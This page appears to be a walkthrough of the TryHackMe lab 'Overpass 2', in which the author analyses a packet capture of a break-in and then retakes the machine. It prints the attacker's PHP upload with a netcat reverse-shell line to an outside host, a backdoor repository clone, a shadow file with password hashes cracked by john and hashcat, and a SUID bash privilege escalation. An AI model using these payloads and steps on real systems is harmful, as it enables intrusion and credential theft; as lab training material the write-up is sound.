---
layout: page
title: Overpass 2
description: Wireshark expose credentials.
img: 
importance: 4
category: TryHackMe
team: Red Team Labs
related_publications: false
---

<div class="row justify-content-sm-center">
    <div class="col-sm-4 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/overpass2/logo.png" title="THM Overpass 2 - Hacked Logo" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<h2>Link</h2>
<a href="https://tryhackme.com/room/overpass2hacked">Room Link</a>

<br/>
<h2>Process</h2>

<br/>
Time to hack the hackers on the overpass.  This one is going to be a little different.  We are dealing with hackers instead of being the hackers.

Open the provided pcap in Wireshark.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/overpass2/pcap.png" title="Provided pcap" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Search through the traffic to identify the POST request that uploads the malicious file with the payload.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/overpass2/post.png" title="Malicious upload" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Right-click on the request and copy as ASCII text and paste it in a text editor.  I find it easier to read.

{% raw %}
```bash
)n)HE
.@@VTvPr:
'
+5P,POST /development/upload.php HTTP/1.1
Host: 192.168.170.159
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.170.159/development/
Content-Type: multipart/form-data; boundary=---------------------------1809049028579987031515260006
Content-Length: 454
Connection: keep-alive
Upgrade-Insecure-Requests: 1

-----------------------------1809049028579987031515260006
Content-Disposition: form-data; name="fileToUpload"; filename="payload.php"
Content-Type: application/x-php

<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>

-----------------------------1809049028579987031515260006
Content-Disposition: form-data; name="submit"

Upload File
-----------------------------1809049028579987031515260006--
```
{% endraw %}

<br />
Look through the traffic to look for the traffic looking for the request that contains the password the attacker used to su into the james account.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/overpass2/supasswd.png" title="SU Passwd" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Copy this as ASCII text if you find this helpful.

{% raw %}
```bash
)n)HEKwa@@Pg	anA
 5Q whenevernoteartinstant
```
{% endraw %}

<br />
Look through the traffic to find the request that clones the persistence repository.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/overpass2/clone.png" title="Clone the repository" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

{% raw %}
```bash
)n)HEhwu@@Pg1	a7*
!5Qgit clone https://github.com/NinjaJc01/ssh-backdoor
```
{% endraw %}

<br />
Search through the traffic and find the request where the attacker reads the shadow file.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/overpass2/shadow.png" title="Shadow File Request" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Save it to a file so we can feed it to a cracker.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/overpass2]
└─$ cat shadow    
root:*:18295:0:99999:7:::
daemon:*:18295:0:99999:7:::
bin:*:18295:0:99999:7:::
sys:*:18295:0:99999:7:::
sync:*:18295:0:99999:7:::
games:*:18295:0:99999:7:::
man:*:18295:0:99999:7:::
lp:*:18295:0:99999:7:::
mail:*:18295:0:99999:7:::
news:*:18295:0:99999:7:::
uucp:*:18295:0:99999:7:::
proxy:*:18295:0:99999:7:::
www-data:*:18295:0:99999:7:::
backup:*:18295:0:99999:7:::
list:*:18295:0:99999:7:::
irc:*:18295:0:99999:7:::
gnats:*:18295:0:99999:7:::
nobody:*:18295:0:99999:7:::
systemd-network:*:18295:0:99999:7:::
systemd-resolve:*:18295:0:99999:7:::
syslog:*:18295:0:99999:7:::
messagebus:*:18295:0:99999:7:::
_apt:*:18295:0:99999:7:::
lxd:*:18295:0:99999:7:::
uuidd:*:18295:0:99999:7:::
dnsmasq:*:18295:0:99999:7:::
landscape:*:18295:0:99999:7:::
pollinate:*:18295:0:99999:7:::
sshd:*:18464:0:99999:7:::
james:$6$7GS5e.yv$HqIH5MthpGWpczr3MnwDHlED8gbVSHt7ma8yxzBM8LuBReDV5e1Pu/VuRskugt1Ckul/SKGX.5PyMpzAYo3Cg/:18464:0:99999:7:::
paradox:$6$oRXQu43X$WaAj3Z/4sEPV1mJdHsyJkIZm1rjjnNxrY5c8GElJIjG7u36xSgMGwKA2woDIFudtyqY37YCyukiHJPhi4IU7H0:18464:0:99999:7:::
szymex:$6$B.EnuXiO$f/u00HosZIO3UQCEJplazoQtH8WJjSX/ooBjwmYfEOTcqCAlMjeFIgYWqR5Aj2vsfRyf6x1wXxKitcPUjcXlX/:18464:0:99999:7:::
bee:$6$.SqHrp6z$B4rWPi0Hkj0gbQMFujz1KHVs9VrSFu7AU9CxWrZV7GzH05tYPL1xRzUJlFHbyp0K9TAeY1M6niFseB9VLBWSo0:18464:0:99999:7:::
muirland:$6$SWybS8o2$9diveQinxy8PJQnGQQWbTNKeb2AiSp.i8KznuAjYbqI3q04Rf5hjHPer3weiC.2MrOj2o1Sw/fd2cu0kC6dUP.:18464:0:99999:7:::
```
{% endraw %}

<br />
Use john to crack the passwords in the shadow file.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/overpass2]
└─$ john --wordlist=/usr/share/wordlists/fasttrack.txt shadow                                                                                    
Using default input encoding: UTF-8
Loaded 5 password hashes with 5 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
secret12         (bee)     
abcd123          (szymex)     
1qaz2wsx         (muirland)     
secuirty3        (paradox)     
4g 0:00:00:00 DONE (2025-02-18 14:19) 19.04g/s 1247p/s 6238c/s 6238C/s Spring2017..starwars
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
{% endraw %}

<br />
Check the repo for the ssh-backdoor.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/overpass2/repo.png" title="SSH-Backdoor repo" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://github.com/NinjaJc01/ssh-backdoor">https://github.com/NinjaJc01/ssh-backdoor</a>

<br />
Read the main.go file to get the string hash variable.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/overpass2/hashvar.png" title="The Hash Variable" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Keep reading the source code to get the salt value.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/overpass2/salt.png" title="Salt Value" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Look through the traffic to get the hash value that the attacker used to set-up the ssh-backdoor.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/overpass2/setup.png" title="Get Attacker Hash" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

{% raw %}
```bash
)n)HEw@@Pg	az0
Sj5R ./backdoor -a 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed
```
{% endraw %}

<br />
Run hash-identifier to identify the type of hash.

{% raw %}
```bash
┌──(kali㉿kali)-[~]
└─$ hash-identifier                                      
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed

Possible Hashs:
[+] SHA-512
[+] Whirlpool

Least Possible Hashs:
[+] SHA-512(HMAC)
[+] Whirlpool(HMAC)
--------------------------------------------------
```
{% endraw %}

Create a file that contains the hash and salt, delimited by a colon.

{% raw %}
```bash
┌──(kali㉿kali)-[~]
└─$ cat hashcat                 
6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05
```
{% endraw %}

<br />
Run hashcat to brute-force the attacker's hash.

{% raw %}
```bash
┌──(kali㉿kali)-[~]
└─$ hashcat -m 1710 -a 0 hashcat /usr/share/wordlists/rockyou.txt --quiet
6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05:november16
```
{% endraw %}

<br />
Now, it is time to recover the machine.  Let's give nmap a run to see what services are running on the top ports.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/overpass2]
└─$ sudo nmap -sC -sV -A -O -oN nmap 10.10.144.138
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-18 18:42 AEDT
Nmap scan report for 10.10.144.138
Host is up (0.27s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e4:3a:be:ed:ff:a7:02:d2:6a:d6:d0:bb:7f:38:5e:cb (RSA)
|   256 fc:6f:22:c2:13:4f:9c:62:4f:90:c9:3a:7e:77:d6:d4 (ECDSA)
|_  256 15:fd:40:0a:65:59:a9:b5:0e:57:1b:23:0a:96:63:05 (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: LOL Hacked
|_http-server-header: Apache/2.4.29 (Ubuntu)
2222/tcp open  ssh     OpenSSH 8.2p1 Debian 4 (protocol 2.0)
| ssh-hostkey: 
|_  2048 a2:a6:d2:18:79:e3:b0:20:a2:4f:aa:b6:ac:2e:6b:f2 (RSA)
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 143/tcp)
HOP RTT       ADDRESS
1   7.92 ms   10.4.0.1
2   ... 3
4   262.88 ms 10.10.144.138

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.95 seconds
```
{% endraw %}

<br />
SSH into the service running on port 2222.  You might have to specify the algorithm.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/overpass2]
└─$ ssh 10.10.195.179 -p 2222                 
Unable to negotiate with 10.10.195.179 port 2222: no matching host key type found. Their offer: ssh-rsa
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/thm/overpass2]
└─$ ssh 10.10.195.179 -p 2222 -oHostKeyAlgorithms=+ssh-rsa                                                                     
The authenticity of host '[10.10.195.179]:2222 ([10.10.195.179]:2222)' can't be established.
RSA key fingerprint is SHA256:z0OyQNW5sa3rr6mR7yDMo1avzRRPcapaYwOxjttuZ58.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.195.179]:2222' (RSA) to the list of known hosts.
kali@10.10.195.179's password: 
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

james@overpass-production:/home/james/ssh-backdoor$
```
{% endraw %}

<br />
Get the user.txt flag.

{% raw %}
```bash
james@overpass-production:/home/james$ cat user.txt
<redacted>
james@overpass-production:/home/james$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:cf:24:2c:ac:63 brd ff:ff:ff:ff:ff:ff
    inet 10.10.195.179/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 2935sec preferred_lft 2935sec
    inet6 fe80::cf:24ff:fe2c:ac63/64 scope link 
       valid_lft forever preferred_lft forever
```
{% endraw %}

<br />
Check for potentially hidden files.  Notice the .suid_bash executable.  Try running it.  Why not?  What's the worst that could happen?

{% raw %}
```bash
james@overpass-production:/home/james$ ls -la
total 1136
drwxr-xr-x 7 james james    4096 Jul 22  2020 .
drwxr-xr-x 7 root  root     4096 Jul 21  2020 ..
lrwxrwxrwx 1 james james       9 Jul 21  2020 .bash_history -> /dev/null
-rw-r--r-- 1 james james     220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 james james    3771 Apr  4  2018 .bashrc
drwx------ 2 james james    4096 Jul 21  2020 .cache
drwx------ 3 james james    4096 Jul 21  2020 .gnupg
drwxrwxr-x 3 james james    4096 Jul 22  2020 .local
-rw------- 1 james james      51 Jul 21  2020 .overpass
-rw-r--r-- 1 james james     807 Apr  4  2018 .profile
-rw-r--r-- 1 james james       0 Jul 21  2020 .sudo_as_admin_successful
-rwsr-sr-x 1 root  root  1113504 Jul 22  2020 .suid_bash
drwxrwxr-x 3 james james    4096 Jul 22  2020 ssh-backdoor
-rw-rw-r-- 1 james james      38 Jul 22  2020 user.txt
drwxrwxr-x 7 james james    4096 Jul 21  2020 www
james@overpass-production:/home/james$ /home/james/.suid_bash  
.suid_bash-4.4$
```
{% endraw %}

<br />
Try to read the root.txt to test it.  Nope! Fail!

{% raw %}
```bash
.suid_bash-4.4$ cat /root/root.txt
cat: /root/root.txt: Permission denied
```
{% endraw %}

<br />
Check the GTFO Bins for bash to see what else we can do.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/overpass2/gtfobins.png" title="GTFO Bins" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://gtfobins.github.io/gtfobins/bash/">https://gtfobins.github.io/gtfobins/bash/</a>

<br />
Run suid_bash again with the -p option.

{% raw %}
```bash
james@overpass-production:/home/james$ /home/james/.suid_bash -p
.suid_bash-4.4# id
uid=1000(james) gid=1000(james) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd),1000(james)
.suid_bash-4.4# whoami
root
```
{% endraw %}

<br />
Get the root.txt flag.

{% raw %}
```bash
.suid_bash-4.4# cat /root/root.txt
<redacted>
.suid_bash-4.4# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:cf:24:2c:ac:63 brd ff:ff:ff:ff:ff:ff
    inet 10.10.195.179/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 3306sec preferred_lft 3306sec
    inet6 fe80::cf:24ff:fe2c:ac63/64 scope link 
       valid_lft forever preferred_lft forever
```
{% endraw %}

<br />
Thanks for giving this a read.  I will see you in the next one.
